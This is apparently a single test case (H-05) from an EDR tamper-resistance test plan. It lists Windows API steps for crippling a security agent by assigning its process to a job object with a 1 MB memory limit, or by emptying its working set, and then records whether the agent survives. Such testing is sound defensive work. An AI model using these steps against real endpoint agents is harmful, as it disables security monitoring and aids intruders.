# H-05

Test whether resource constraints via job objects or quotas can disable the agent.

1. Open the agent: `OpenProcess(PROCESS_SET_QUOTA | PROCESS_SET_INFORMATION | PROCESS_TERMINATE, FALSE, pid)`.
2. Create a job object: `CreateJobObjectW(NULL, L"EDR_BYPASS_TEST_JOB")`.
3. Set a memory limit: `JOBOBJECT_EXTENDED_LIMIT_INFORMATION.ProcessMemoryLimit = 1MB`. Apply with `SetInformationJobObject`.
4. Assign: `AssignProcessToJobObject(hJob, hAgent)`.
5. If the assignment succeeds, the agent is now constrained to 1 MB committed memory. It will likely crash or be terminated by the OS.
6. Wait 30 seconds. Check `sc query <service>`.
7. If the agent continues to run and enforce (re-run S-03), record `hold`.
8. If the agent crashed or stopped, record `miss`.
9. Alternatively, try `SetProcessWorkingSetSizeEx(hAgent, (SIZE_T)-1, (SIZE_T)-1, ...)` to empty the working set.
10. Cleanup: close the job handle; restart the service if needed.
